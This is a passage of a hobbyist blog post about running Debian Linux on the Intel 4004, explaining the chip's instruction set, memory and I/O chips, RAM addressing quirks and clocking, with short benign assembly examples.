<h3>TL;DR</h3>
<p>I booted Debian Linux on a 4-bit intel microprocessor from 1971 - the first microprocessor in the world - the 4004. It is not fast, but it is a real Linux kernel with a Debian rootfs on a real board whose only CPU is a real intel 4004 from the 1970s. The video is sped up at variable rates to demonstarte this without boring you. The clock and calendar in the video are accurate. A constant-rate video is linked below.

<h2>In the beginning...</h2>
<p>In 2012, I <a href="https://dmitry.gr/?r=05.Projects&amp;proj=07.%20Linux%20on%208bit">ran real Linux on an 8-bit microcontroller (AVR)</a>, setting a new world record for lowest-end-machine to ever run Linux. A natural extension of that project was into something faster and more practical, and <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">I did that</a>. Others also did <a href="https://hackaday.com/2014/04/09/using-simms-to-add-some-extra-ram-on-your-arduino-uno/">follow-up</a> work based on the original project. Some exciting work also happened based on my LinuxCard followup, my favourite being <a href="https://www.hackster.io/news/the-decstation-2040-puts-what-was-once-the-fastest-unix-system-in-the-world-in-your-wallet-f81000b9b51a">this gem</a>. Nobody really tackled the actual record for about eleven years. In 2023, there was <a href="https://github.com/raspiduino/arv32-opt">this advancement</a>. It is still an AVR, so it is not <em>much</em> lower-end, but it does use an AVR with less RAM, so it counts. This is especially true since the author was clearly aiming to beat my record (as per the <a href="https://github.com/raspiduino/arv32-opt/blob/main/README.md">README</a>). An even more impressive effort was seen, also in 2023, <a href="https://github.com/onnokort/semu-c64">here</a>. That one boots Linux (in emulation) on a <a href="https://en.wikipedia.org/wiki/MOS_Technology_6510">MOS 6510</a>. This is a much older-style 8-bit CPU and thus definitely counts as lower-end than an AVR. So, it seems that after 11 years on top (or...bottom), my record had been beaten. This would not do!
</p>
<p>What would be lower-end than an AVR or a MOS 6510? AVR is a very modern pipelined architecture, delivering nearly 1.0 MIPS/MHz. The 6510 is also also rather performant per-cycle. This was not always the case with CPUs. Squeezing even half that performance per MHz out of, say, an 8086 would be quite hard. But 8086 is a 16-bit chip, so it would not necessarily count as lower-end than an 8-bitter. <a href"https:="" en.wikipedia.org="" wiki="" intel_8080"="">Intel 8080</a> exists, and it is an 8-bit chip from 1974. Its instructions take 4-11 cycles, so it is more typical of the original 8-bitters. however, the 8080 is just an upgraded version of the <a href="https://en.wikipedia.org/wiki/Intel_8008">Intel 8008</a> from 1972, so logically the 8008 would be a more tantalizing target anyways, being older and thus cooler. At this point, though, we're approaching the start of microprocessor history, 1972 being only a year after the <a href="https://en.wikipedia.org/wiki/Intel_4004">Intel 4004</a> came out. The 4004 is considered to be the first commercially-produced microprocessor. So, as long as I am going to go back in history, why not go <em>all the way back</em>? Plus, it being a 4-bit chip, this unambiguously sets a new low bar! Thus this project was born...
</p>

<h2>The 4004</h2>
<p>This is a not-so-short summary of how the 4004 works. I found a lot of information online about it that was incomplete, incorrect, or simply incomprehensible. Now that I've sorted it all out for you, enjoy! To skip this section (not advisable), <a href="#skip4004">click here</a>. To read the original intel MCS-04 manual <a href="https://dmitry.gr/images/MCS-4_UsersManual.pdf">click here</a>.
</p>
<h3>Like we did in the good ol' days</h3>
<p>To someone used to today's MCUs, the 4004 will look mighty weird. To start with, it operates on 4-bit quantities only. The only flag is the carry flag. Instructions are mostly one byte long and take 8 clock cycles to execute. Some instructions are two bytes long and take 16 cycles to execute. Just to keep you on your toes, there does exist a single one-byte instruction that takes 16 cycles - <span>FIN</span>. However, that is only the beginning. The fact that this chip was developed for a calculator is quite evident in the fact that it has no logical operations at all. There is no <span>AND</span>, <span>OR</span>, or <span>XOR</span> operations at all. It is a one-operand instruction set, so the accumulator is usually the target of operations. So, if we have no logical ops, what do we have? <span>ADD</span> and <span>SUB</span> basically. To be precise, addition is always with carry and subtraction is always with borrow. This, again, shows off the 4004's "calculator" roots. For extra credit, and contrary to some of the docs you'll find out there, the usage of the carry flag during subtraction is quite weird... Some architectures treat the carry flag during subtraction as "borrow", as in: it'll be set if there was a borrow, and cleared otherwise. Other architectures treat the carry flag during subtraction as "not borrow", meaning that it'll be cleared if there was a borrow, and set if there was not. The key thing is that in every architecture I've evern encountered, it was one of those two options.
</p>

<h3>But with a twist...</h3>
<p>The 4004 seemingly finds a third option. On the way in to the <span>SUB</span> instruction, the carry flag means "borrow", but after the <span>SUB</span> instruction, it means "not borrow". Yes, this is correct and I've verified this on the real hardware. I read one old newsgroup post (that I can no longer locate) where this was blamed on not having space for an extra XOR gate in the chip. The practical upshot of this is that to add a multi-nibble number to another multi-nibble number, simply clearing the carry up front and then using <span>ADD</span> on each nibble will work. To do a multi-nibble subtraction, one needs to not only clear the carry bit up front, but also invert it after each <span>SUB</span> instruction.
</p>
<p>The 4004 is surprisingly register-heavy for such an early design. It has 16 internal registers, each 4 bits in size. PC is 12 bits long, and the hardware return stack is 4-deep. The current top element of the stack is used as <span calss="code">PC</span> so maximum actual function nesting possible is 3-deep. All together, that is 112 bits of state, which would be a whole lot of transistors in 1971, if you were to make that out of SRAM. It would take 672 transistors. That's quite a lot for a chip whose total transistor count is 2,300. So what did Intel do? They used DRAM for these bits! This is one of the reasons that the 4004 has a minimal clock speed, below which it will fail to work. This is rather unlike modern microcontrollers, most of which can operate all the way down to DC. Another slight weirdness is that 4004 has no interrupt support at all!
</p>
<p>An unexpected luxury in a one-operand CPU is the presence of direct operations on memory operands. Well, only <em>FROM</em> memory, but still. There exists <span>ADM</span> which adds a nibble from RAM to the accumulator and <span>SBM</span> that subtracts a memory nibble from the accumulator. Other than those, all other operations only operate on the accumulator, sourcing data from the internal registers when a second operand is needed. Another somewhat weird thing is that while there is an instruction to load a register value into the accumulator (<span>LD</span>), there is not one to write the accumulator to a register. To do that one must use the <span>XCH</span> instruction that swaps the accumulator's value with that of a register. This is somewhat annoying since storing the same value into two registers now takes three operations instead of two. I guess that this was a compromise necessary to fit all the desired instructions into the encoding space provided by just-8-bit-long instructions.
</p>
<p>So what else is there? Of course there is <span>NOP</span>, encoded officially as <span>0x00</span>, but any byte less than <span>0x10</span> is treated as such. This is not a coincidence. The 4004 treats each instruction as being made of two 4-bit parts. The high part is called <span>OPR</span> and is sent on the bus first. The low byte is called <span>OPA</span> and is sent on the bus second. In general, <span>OPR</span> encodes the instruction and <span>OPA</span> is the parameter/index/etc for it. With this in mind, it is understandable why every instruction with the top nibble of zero is a <span>NOP</span>. Some instructions you'll find in the 4004 are pretty typical of early processors. <span>IAC</span> (increment accumulator) and <span>DAC</span> (decrement accumulator) make an appearance, of course, acting on the accumulator and setting the carry flag. But there is also <span>INC</span> which will increment a register and will not affect the carry flag. There is no <span>DEC</span>. Loading an immediate nibble-sized value into the accumulator is accomplished using <span>LDM</span>. Bit-shifts are always by one bit and always though the carry flag. <span>RAR</span> (rotate right) and <span>RAL</span> (rotate left) thus deliver precisely what they promise.
</p>
<p>Since the carry flag is so often used, there are instrctions specifically for managing it. <span>STC</span> (set carry) will set it, <span>CLC</span> (clear carry) will clear it, and <span>CMC</span> (compliment carry) will toggle it. There is also <span>CLB</span> (clear both) which will clear carry as well as the accumulator and <span>TCC</span> (transfer and clear carry), which will set the accumulator to the value of the carry flag (0 or 1) and clear the carry flag itself. This turns out to be useful in all sorts of places, actually. Finally, there is <span>TCS</span> (transfer carry for subtraction) which is more useful for BCD math than it is for binary math. It will set the accumulator to "9 + carry" and clear the carry flag. I have found no use for this instruction yet in my code.
</p>
<p>As far as weird instruction go, there are two more that are not all that useful. <span>DAA</span> (decimal adjust for addition) is one. If the accumulator is 9 or greater, or if the carry is set, 6 is added to the accumulator. Carry is set if the addition generates a carry, it is not affected in all other cases. This is also used for BCD math and is thus useless for my purposes. Another instruction of dubious value is <span>KBP</span> (keyboard process). It implements something like "count trailing zeroes", but only for powers of two. For an input of 0, it produces zero, for an input that is a power of two, it produces one more than the log base two of the value, for all other inputs it produces 15. This was meant to allow for easy keyboard decoding, I suppose.
</p>
<p>There are two more ways to load immediates in the 4004, and both of them are a godsend for writing actual useful code. First, there is <span>FIM</span> (fetch immediate). This two-byte instruction will load 8 bits of immediate data into two consecutive registers, starting with an even-numbered one. The accumulator and the carry bit are unaffected, making this a nice way to load loop counter values into registers. A similar, in some ways, <span>FIN</span> (fetch indirect) will load two consecutive registers with an 8-bit immediate loaded from the code ROM's current page. As the 4004 is a Harvard-architecture CPU, the code and data spaces are entirely different and this is one of the ways to make constant tables work. Since using a single nibble as the address would not work, two registers are used, allowing for addressing up to 256 bytes of data. There would not be enough encoding space in the 8-bit instruction to encode a 3-bit destination register pair number, a 3-bit source register pair number, <em>and</em> the 4-bit <span>OPR</span>. Two possibilities existed here. One would be to use the same register pair for input and output. This would preserve the orthogonality of the instruction set but make actual use harder. The second (and what intel chose) was to hardcode one of the register sets. And indeed, <span>FIN</span> always uses <span>r0:r1</span> as the address to read from, while the destination register pair is encoded in the instruction, and may, in fact, be <span>r0:r1</span>.
</p>
<h3>Control flow in the 4004</h3>
<p>As I mentioned, there is a hardware stack for subroutines. <span>JMS</span> (jump to subroutine) is a 2-byte instruction that will push the address of the next instruction onto the hardware stack and then jump to anywhere in the 12-bit code address space. <span>JUN</span> (jump unconditional) will do the same without pushing a return address. Both of these can thus reach any instruction in the code address space. Returning from a soubroutine is accomplished using <span>BBL</span> (branch back and load), which will jump to an address popped from the return stack and load an immediate encoded in the instruction into the accumulator. An astute reader will note that this means that it is thus impossible to return a dynamic value from a subroutine in the accumulator, and this is so. This is actually similar to PIC12's <span><a href="https://onlinedocs.microchip.com/pr/GUID-04F283CC-FA3E-46C3-9513-4F7618EB862D-en-US-3/index.html?GUID-1C04EB55-483B-4EF1-89B0-4AD59984F215">RETLW</a></span>, and may be used as such, to implement tables of data. That would, however, require an ability to execute a calculated indirect jump. And that ability exists. <span>JIN</span> (jump indirect) will jump to an address in the current code page that comes from a pair of consecutive registers. Another unexpected creature comfort is the <span>ISZ</span> (increment and skip if zero) instruction. It does not quite do what you'd think though. It will increment a register with no effect on carry, if the result is not zero, it will jump to an address encoded in the instruction (and limited to the current code page). If the result was zero, it will not jump and execution will continue after it. This can be used to implement loops relatively easily.
</p>
<p>Conditional jumps in the 4004 are also somewhat strange. 16 possible conditions exist, and given what you know about the 4004 so far, try to guess how that is possible! Sure, one can branch on carry, or on accumulator being zero, but that does not make 16 possible conditions. <span>JCN</span> (jump conditional) will execute a conditional jump to an address in the current code page if the specified condition is met. The condition is made of three clauses, each of which may be enabled, and considered met if any of the enabled clauses are true. There is an extra bit in the encoding to invert the final result. The clauses are: "accumulator is zero", "carry is nonzero", "<span>TEST</span> pin is logical zero". Indeed this means that complex conditions can be tested in one instruction. In reality, though, this does not work and combinations that you'd want end up being impossible. For example, I would have loved an "jump if accumulator is zero and carry is zero" or "jump if accumulator is nonzero or carry is nonzero" but neither of those is encodeable in the way intel chose to implement this instruction.
</p>
<p>"Now what is this <span>TEST</span> pin?" you might ask. This is an input pin directly on the 4004 that can be tested directly via a conditional jump. This is the only input that is on the 4004 directly and this is as close as you'll get to handling interrupts on the 4004. If your external hardware signals some condition via this pin and your code remembers to poll it often enough, you could use this to signal your code about external events. This is the only general-purpose input pin on the 4004. It has no general-purpose output pins.
</p>
<p>I mentioned code pages above. What does this mean? While the entire code space is 4096 bytes (addressable via 12 bits), some instructions lack the encoding space to address it all. So, a "code page" is just the range of code ROM that contains the current PC, starting at the previous multiple-of-256-address and ending just before the next one. It should be noted that "current PC" is the address of the <em>NEXT</em> instruction. This matters for instructions that end on a page boundary. Such instructions thusly placed can only target the next page. <span>FIN</span>, <span>JCN</span> and <span>ISZ</span> are affected by this. This situation of conditional branches being limited in range compared to unconditional ones is common, and even modern architectures like ARMv6M have similar limitations.
</p>
<h3>Memory and I/O in the 4004</h3>
<p>The 4004 is not quite a complete processor. There are some instructions that it does not process at all. In fact, it does not at all process any memory instructions. Memory instructions are all whose <span>OPR</span> is 14. For them, the CPU will look at the top bit of <span>OPA</span> only. If it is set, the instruction is a read and during the <span>X2</span> bus phase, the CPU will sample the bus and consider that the read value. If the top bit of <span>OPA</span> was clear, the CPU will place the written value onto the bus during the <span>X2</span> phase. What is interesting here is that there are a few different read instructions and a few different write instructions, and the CPU knows nothing about how to perform them. When it sees an <span>OPR</span> of 14 (which will happen during the first bus phase fetching the instruction - the <span>M1</span> phase), it will activate the <span>CM-ROM</span> and <span>CM-RAM</span> of the currently-enabled ROM and RAM banks, thus notifying all memory chips to watch the second nibble of the instruction (which will be sent during the next bus phase: <span>M2</span>). They watch the value of <span>OPA</span> (during bus phase <span>M2</span>), decide if they can execute this instruction, and if so, place the proper value or get the proper value from the bus during phase <span>X2</span>. So, one could argue that the 4001/4002/4289/4265/4308 memory chips are part of the CPU, since they decode and execute certain instructions. Intel used this to great success in the 4289 and 4265, which will decode many of the instructions in that space differently. One could even imagine a coprocessor that allows 4004 to execute custom instructions and transfer 4 bits of data per instr using this ability.
</p>
<p><a href="https://dmitry.gr/images/4004memBanks.png"><img alt="A schematic for using a 3-to-8 decoder to connect 8 RAM banks to the 4004" src="https://dmitry.gr/images/4004memBanks.png"></a></p><p>It is also interesting that the 4004 has no addressing modes, not even the concept of that exists. Its support for memory is rather rudimentary, in fact. It is also rather unlike what modern chips do, so I'll explain it. First of all, there can be up to 8 banks of RAM. Up to 4 banks can be supported without any external decode circuitry, and up to 8 can be supported with an external 3-to-8 decoder. How can this be? The 4004 has 4 <span>CM-RAM</span> outputs, which are basically RAM bank selects. If banks 0..3 are selected, only the respective <span>CM-RAM</span> line will be active during the proper time. If banks 4..7 are selected, a combination of <span>CM-RAM</span> pins is activated, but no combination includes <span>CM-RAM0</span>. Thus 7 combinations are possible, but of them one is al zeroes (unused), and three are a single active line (already accounted for above), thus there are four more combinations possible here, and they are used to encode banks 4..7. In reality, one could expand this infinitely, simply by using a few external latches and some OR gates to only pass the select signal to some chips but not others. I am not aware of any design that did this, but I verified that this works as you'd expect. The 4004 only has one <span>CM-ROM</span> (ROM select signal), and thus can only natively address just 4096 bytes of ROM. Here, too, with minimal external circuitry one could expand this to more.

<p><a href="https://dmitry.gr/images/4004-4001options.png"><img alt="Intel's diagram showing the 4001 I/O port ordering options" src="https://dmitry.gr/images/4004-4001optionsSmall.png"></a></p><p>Intel intended the 4001 to be the ROM for the 4004. It is a mask ROM that holds 256 bytes of data and contains a 4-bit I/O port. Each 4001, internally, knows its own "ROM number". What is that? Well, the 4004 can address 4096 bytes of ROM and the 4001 only holds 256. Logically one would need 16 4001s to fill the address space, but since there are not 16 chip selects coming out of the 4004, how would each ROM know when it is addressed? The last nibble transferred from the CPU on the bus during the <span>A3</span> phase is compared by each 4001 to its internal "ROM number". If it is not a match, the 4001 will do nothing more till the next instruction cycle. If it is a match, it will consider itself active and provide data the 4004 requested, from the address it got during the <span>A1</span> and <span>A2</span> bus phases. 
</p>
<p>The 4001 is not programmable, it was meant to be custom-made for a customer. One would ship to intel the bytes one wanted in the ROM and intel would manufacture the 4001 containing those bytes - they are physically wired into the chip via its metal mask. The same applies to the I/O port on the 4001. It is a 4-bit wide port, and each pin could be an input or an output; have a pull-up, pull-down, or neither; could be inverting or not. The diagram shown here shows all the options. Each depicted switch could be closed or open. Some combinations, of course, make no sense, and intel warns so in their datasheet.
</p>
<p>If you happen to buy a 4001 on eBay, you have no idea what its port config and "ROM number" is. You just have to test. Most ROMs out there are "ROM number" 0, which makes them especially useless for a home project. If they respond to address 0, then your code (presumably elsewhere in the address space) will never get to run. So why would you even buy a 4001 if it permanently contains code you cannot modify? Well, for the chance that it has an input port, since the 4002 does not, for some reason.
</p>
<p>As I had mentioned above, the 4004 does not perform any memory operations - the other chips on the bus are expected to decode them and perform them if they are selected. The "selection" is made of a few parts. First is the <span>CM-ROM</span> line needs to indicate that this ROM bank is active during bus phase <span>A3</span> (for code read) or <span>X2</span> (for I/O ops). In the 4004, there is only one ROM back, so this is always the case. The 4040 has two <span>CM-ROM</span> lines and thus one bank may be not selected. The second part of "selection" is whether the current chip in the bank is selected. This is determined from the last <span>SRC</span> instruction performed while this bank was selected. The chip thus addressed remembers this until another <span>SRC</span> instruction is observed while this bank is selected.
</p>
<p>So, which instructions does the 4001 decode and execute? <span>SRC</span> is used to select which 4001 (of the 16 that make up a bank) is selected for I/O. The top nibble of the provided address (sent during <span>X2</span> bus phase) determines which chip considers itself selected for I/O. Besides that, the 4001 only handles <span>WRR</span> (write ROM port) and <span>RDR</span> (read ROM port) instructions, and they do precisely what you'd expect from the names. As the I/O pins are not configurable and direction is locked at manufacturing time, there is no further config to perform. One curious thing is that when performing a read of the port, the I/O lines configured as outputs do not return the data they are outputting, instead they return a hardcoded value, that may be configured at manufacturing time to be either high or low.
</p>
<p>The 4308 is basically the same as four 4001s in one package. It contains 1024 bytes of ROM and 4 I/O ports. It responds to four consecutive "ROM numbers". It is just a board-space optimization with nothing else interesting about it.
</p>
<h4>4002</h4>
<p>The 4002 is the special memory for the MCS-04 system. It contains 320 bits of DRAM, refresh circuitry, and a 4-bit output-only port. I am not sure why intel made this decision, but this is so. Unlike the 4001, there is no mask ROM in here, so there would be no way to assign a "RAM number" to a chip. A different system is used. Each bank of RAM may have 4 4002s in it. So, logically, to determine a chip's index in a bank, we need two bits of information. One bit (the lower one) comes from the <span>P0</span> input pin on each 4002 itself. The second bit is special per chip model. There are two: the 4002-1 and 4002-2. Thus a complete RAM bank, in order, will be made of: a 4002-1 with P0 = Vss, a 4002-1 with P0 = Vdd, a 4002-2 with P0 = Vss, and a 4002-2 with P0 = Vdd.
</p>
<p>While the 4004 only has one <span>CM-ROM</span> output, it has 4 <span>CM-RAM</span> outputs, and as I mentioned above, this allows up to 4 banks of RAM without external circuitry and up to 8 with a single extra chip. So, a top-spec 4004 system without an extra decoder chip can have 16 4002s attached to it, for a total RAM capacity of 5120 bits (640 bytes). With a 3-to-8 decoder, the numbers double. In reality, memory addressing is not quite simple in 4004. So, if you were to only consider RAM you could address as a linear block that you could iterate over using a pointer, it is important to remember that each 4002 only has 256 bits of that. So a top-spec system would have 4096 bits (512 bytes) of that kind of directly-addressable RAM, assuming full 4 banks. I'll talk more about RAM addressing in the 4004 later. For now: each RAM bank is made of 256 nibbles addressable directly and 64 more, addressable <em>weirdly</em>.
</p>
<p>So, what instructions does the 4002 handle? <span>SRC</span>, again, is used to select the chip in the current bank, both for I/O as well as for memory access. The top 2 bits of the 8-bit address sent select one of chips in the RAM bank. <span>RDR</span>, <span>ADM</span>, and <span>SBM</span> all read the nibble addressed by the last address sent via the <span>SRC</span> instruction. <span>RD0</span>, <span>RD1</span>, <span>RD2</span>, and <span>RD3</span> read the status nibbles (more on them later). <span>WR0</span>, <span>WR1</span>, <span>WR2</span>, and <span>WR3</span> write the status nibbles. <span>WRM</span> writes the <span>SRC</span>-addressed nibble - it is the opposite of <span>RDM</span>. The only other instruction the 4002 executes is <span>WMP</span> (write memory port), which sets the output value to be presented on the 4-bit output port of the currently-selected chip. The value will keep being outputted till another is written.
</p>
<p>Sadly, there is no 4308 equivalent for RAM - there is no chip that would act like a full bank of RAM for the 4004. The 4265 can sort-of come close, but not in a fully compatible way.
</p>
<h4>4265</h4>
<p>The 4265 is a general-purpose I/O device designed for the MCS-04 system. It has 4 ports of 4 I/O pins each and supports a number of modes of operation. You can peruse the intel docs on it at your own leisure to read about all the modes. I will only tell you about mode 12, as it relates to using the 4265 for RAM. In mode 12, the 4265 takes up an entire <span>CM-RAM</span> bank and responds to all 256 addresses that a <span>SRC</span> instruction might send. It can be interfaced to a 256x4 SRAM and it will read and write precisely like 4 4002s would. But wait, there is more, since 4265 in this mode also has 2 chip select pins that can be set to arbitrary values. If one were to use them as address lines too, one can interface a 1024x4 SRAM, which is a lot more RAM than a single RAM bank of 4002s could ever hold. Indeed, one would need to switch pages in this bank, as only one 256-nibble view is available at a time, but this is still pretty cool. The reason as to why this is not fully 4002-compatible is that there are no "status nibbles" here, so a 4265 + 256x4 SRAM is not a full replacement for a bank of 4002s if the code at all uses "status nibbles". When I talk about how they work and the advantages of using them, you'll see why this matters. Additionally, while the 4265 indeed has as many potentially-output port pins as 4 4002s would have, the way to control them is also not compatible (and, in fact, if you use 4265 for RAM access, you end up with no general-purpose output pins at all).
</p>
<p>So, which instructions can the 4265 execute? <span>SRC</span> is decoded, as always, to handle inputting an address, of course. <span>WMP</span> (write memory port) is used to select the 4265 mode. In mode 12, <span>RDM</span>, <span>ADM</span>, and <span>SBM</span> will read the addressed nibble in the addressed page of memory. <span>RD0</span>, <span>RD1</span>, <span>RD2</span>, and <span>RD3</span> select the given page, and then do a read. <span>WR0</span>, <span>WR1</span>, <span>WR2</span>, and <span>WR3</span> select the given page and then do a write. <span>WRM</span> writes a nibble at the current address in the current page.
</p>
<h4>4008, 4009, and 4289</h4>
<p>Given that intel will no longer manufacture you a 4001 with your custom contents (I called and asked), and the fact that the MCS-04 bus is rather strange and no other memory chip supports it, one might expect that one will need to do some perverted things to run code on a 4004 today. Of course, a simple FPGA, or even a modern microcontroller with a lot of level shifters could manage to pretend to be a 4001, but this is considered cheating in my book. Luckily, there is another way. There are two, even! Intel created a two-chip solution for a 4004 system to interface to normal garden-variety [[E]EP]ROMs: the 4008 and 4009. The 4008 handles the addressing part - it understands the MCS-04 bus protocol enough to tease out a 12-bit address that the CPU wants to read and can output that on 12 pins. Fancy that! The 4009 also understands the MCS-04 bus protocol, and it decodes memory instructions and generates control signals to handle I/O, ROM reading, and, optionally, writing in some weird ways that I prefer not to think about. It will also latch the 8 bits of data that represent an instruction and dish it out to the 4004 four at a time, as needed. The 4009 understands the same instructions as the 4001 does, except that instead of the I/O port being hardcoded at the intel factory, each write and read is output 4-wide to the outside world, to be dealt with as desired. This allows for a lot more flexibility. There is one more instruction that the 4009 understands that the 4001 does not: <span>WPM</span> (write program memory). This was meant for situations where the backing store was not [[E]EP]ROM but SRAM (eg for development). It works in weird ways that are beyond the scope of my lecture.
</p>
<p>The 4008 and 4009 still need level shifters to connect to normal memories, since they were designed for the 15V EPROMS intel made, like the C1702A. The 4008 and 4009 are also rather hard to obtain nowadays. Luckily, intel also produced a combined chip - the 4289. It is basically a 4008 and a 4009 in one package, with level shifters built in. It can communicate with memories at 5V signal levels! This makes using a 4004 today pretty easy - a 4289 and a 5V 4096x8 [[E]EP]ROM is all it takes, really. The I/O story on the 4289 is also pretty simple and 5V-compatible. There is a pin that goes high when the CPU does an I/O read, and the 4-bit "I/O port" selection is available on 4 pins. Another pin goes high when the CPU does an I/O write, and the data appears on the I/O pins. In theory, this allows connecting up to 16 4-bit input ports and 16 4-bit output ports to the 4004, using simple buffers and decoders.
</p>
<h4>Using memory, and those "status nibbles"</h4>
<p>The 4004 has no concept of addressing modes or even pointers, as I said. The way it addresses and uses memory is rather ... strange. Before you address memory, you need to select a memory bank. To select a RAM bank, one puts the bank number (0..7) into the accumulator and then executes a <span>DCL</span> (designate command line) instruction. This determines which <span>CM-RAM</span> line(s) go active during memory ops, and this selection remains active until another <span>DCL</span> instruction is executed. If no <span>DCL</span> is ever executed, bank 0 is used. There is no way to read back the current bank.
</p>
<p>Each RAM bank (if fully populated), is made of 4 4002s. Each 4002 is made of 4 "registers". Each "register" is made of 16 addressable nibbles and 4 status nibbles. What do I mean by that? Well, if you were to read (using, say, the <span>RDM</span> instruction) memory in a bank from address 0x00 to address 0xFF, you'd first read nibbles 0 through 15 of "register" 0 in the 0th 4002, then the 1st "register" in it, then the 2nd, and then the 3rd. You'd then read the 0th "register" in the 1st 4002, and so on. Thus you'll have accessed every addressable nibble. Note that you did not access any of the "status nibbles" thusly. Those are accessed differently. With any address in a "register" selected, <span>RD0</span> will read that 0th statis nibble attached to this register, <span>WR0</span> will write it. <span>RD1</span>, <span>RD2</span>, <span>RD3</span>, <span>WR1</span>, <span>WR2</span>, and <span>WR3</span> work similarly, as you'd imagine. Note that the status nibbles are thus not pointer addressable in the normal sense. They are also not accessible to <span>ADM</span> and <span>SBM</span> instructions, and thus to do any math on their contents you must first directly load them into the accumulator.
</p>
<p>//these next two lines only needed if
// the current bank is NOT already 3
LDM 3         //load 3 into accumulator
DCL           //select bank 3

//these next 2 lines are only needed if
// the currently selected address is not
// already 0xAB, they also clobber r0, r1
FIM r0, 0xAB  //put 0xAB into r0:r1
SRC r0        //put r0:r1's on the bus as addr

RDM           //read nibble to accumulator
</p>
<p>As I explained, accessing memory is a multi-step process. As the 4004 has no concept of memory addressing, that is left to whatever memory device is attached to the bus. All memory devices watch the bus to see if their <span>CM-RAM</span> (or <span>CM-ROM</span>) line is active during the <span>X2</span> bus phase. If so, that means a <span>SRC</span> instruction is executing. All selected memory devices will receive 4 bits (high nibble of address), and then on the next bus phase (<span>X3</span>) they will receive the next 4 bits (low nibble of address). They will store this internally, and use this address for all future I/O instructions, until another address is sent using <span>SRC</span>. A curious little quirk of this is that every memory bank has its own "current" address, since only the selected bank will interpret a <span>SRC</span> instruction seen on the bus.
</p>

<p>So by now it should be clear that to read a nibble at address 0xAB in bank 3, one might have to do something like what you see here on the right. Best case is just one instruction. This only happens if you already had the bank and the address selected. This is unlikely. Second-best case is 2 instructions. This only happens if you happened to have the address already in a register pair, so you only need to execute a <span>SRC</span> before your <span>RDM</span>. If you did not, you'll need to use a <span>FIM</span> and clobber a register pair to get the address into it before using <span>SRC</span>. And if you also are not sure you have the desired memory bank selected, you might also need to load the proper bank number into the accumulator and execute a <span>DCL</span>. Realistically, you'll often end up with the case of <span>FIM</span> + <span>SRC</span> + <span>LDM</span>, which takes up 4 bytes of code and 4 instruction times. Yes...slow
</p>
<p>//add 32 bits at r2:r3 to 32 bits at r0:r1
//into 32 bits at r4:r5. Clobbers r6
  CLC    //carry cleared for first add
  LDM -8 //-loop iter count
  XCH r6 // ... into r6
loop:
  SRC r0 //set up addr for LHS
  INC r1 //increment LHS ptr
  RDM    //get LHS nibble
  SRC r2 //set up addr for RHS
  INC r3 //increment RHS ptr
  ADM    //add in RHS nibble
  SRC r4 //set up addr for DST
  INC r5 //increment DST ptr
  WRM    //write DST
  ISZ r6, loop //loop
</p>
<p>Now let's imagine doing some math (say an addition) on larger (say 32 bit) values. Obviously, we'll store them little-endian. This'll help us since math happens from LSB to MSB, and thus we'll want to increment the pointer. This is much easier than decrementing it, since <span>INC</span> instruction exists, but <span>DEC</span> does not. We'll also assume our value does not cross a 16-nibble boundary, which makes our address incrementation much simpler. You see that code here on the right. Quite verbose. The total useful work here is 1 carry clearing, 8 loads, 8 load-adds, and 8 stores - a total of 25 useful instruction cycles. This code will, in actuality take 91 instruction cycles. The main culprit, as is clear, is the need to constantly increment pointers and manually send them onto the bus. This situation gets a <em>LOT</em> worse if you are not able to guarantee that the values do not cross a 16-nibble boundary. In that case a simple <span>INC</span> will not do, and a more complex construction will be necessary.
</p>
<p>The issue is not limited to math. A simple implementation of memory copying looks similar and wastes similar amounts of time selecting memory addresses and incrementing registers. As you can imagine, this gets slow very quickly. If you keep some global state in some variables, to access each you need to first waste 2 instruction cycles to load its address into a register pair using <span>FIM</span>, then use one more to send it onto the bus using <span>SRC</span>, and finally you may read it using <span>RDM</span> or write it using <span>WRM</span>. If you have a few global variables that are often used together and in a particular order, you could order them in memory such that accessing the second one does not require using 2 instruction cycles on a <span>FIM</span>, instead using a single <span>INC</span> on the lower nibble of the address you had already loaded. One instruction cycle saved, but you still do need a new <span>SRC</span>. <em>Basically almost every memory access is a 2-instructions-minimum affair, due to the requirement of a <span>SRC</span></em>. For the nitpicky of you, yes, indeed, a read-modify-write of a nibble need not employ a second <span>SRC</span>, but this is rare.
</p>
<p>This is where those status nibbles come in handy. Instead of storing your globals in normal memory, you can stash them in status nibbles. Then, a single <span>SRC</span>, targeting any of the 16 nibbles of the "register" they belong to enables them to be accessed directly using a single one-instruction-cycle instruction (<span>RD0</span>, <span>RD1</span>, <span>RD2</span>, <span>RD3</span>, <span>WR0</span>, <span>WR1</span>, <span>WR2</span>, or <span>WR3</span>). This is wonderful for data that is often accessed, and once you realize the speed advantages of these "status nibbles" you'll want to use them everywhere! This realization allowed me to speed up the 4004 MIPS emulator by a factor of 30%!
</p>
<h3>Performance and clocking</h3>
<p><a href="https://dmitry.gr/images/4004intelSuggestedClocking.png"><img alt="A very complicated schematic showing intel's suggested clock generator for the 4004" src="https://dmitry.gr/images/4004intelSuggestedClockingSmall.png"></a></p><p>All 2-byte 4004 instructions execute in 2 instruction cycles. All but one 1-byte instructions execute in 1 instruction cycle. The exception is <span>FIN</span> which is a one-byte instruction but it takes two instruction cycles. What is an instruction cycle? It is composed of 8 clock cycles, each representing a bus phase. <span>A1</span>, <span>A2</span>, <span>A3</span> are the first three, and they send the desired ROM address to the ROM, LSB first. Next are <span>M1</span> and <span>M2</span> where the ROM outputs the instruction to the CPU (and any memory devices which need to decode it), MSB first. Then come <span>X1</span>, <span>X2</span>, and <span>X3</span>. <span>X1</span> is when the CPU does some of the work on the instruction. <span>X2</span> if when I/O is done between the CPU and any memory/I/O devices, the top nibble of <span>SRC</span>'s address is also sent during this phase. During <span>X3</span> the CPU does more of the work for the instruction, and also, if it is a <span>SRC</span>, the low nibble of the address is put on the bus. During <span>X3</span> the SYNC signal is active, allowing all devices on the bus to [re]sync and prepare for phase <span>A1</span> of the next instruction cycle. The 4004 needs a two-phase non-overlapping clock at a speed of 740KHz. Intel 4004 manual states that 500KHz is the minimum acceptable clock speed, and I can confirm that 10KHz does not work.
</p>
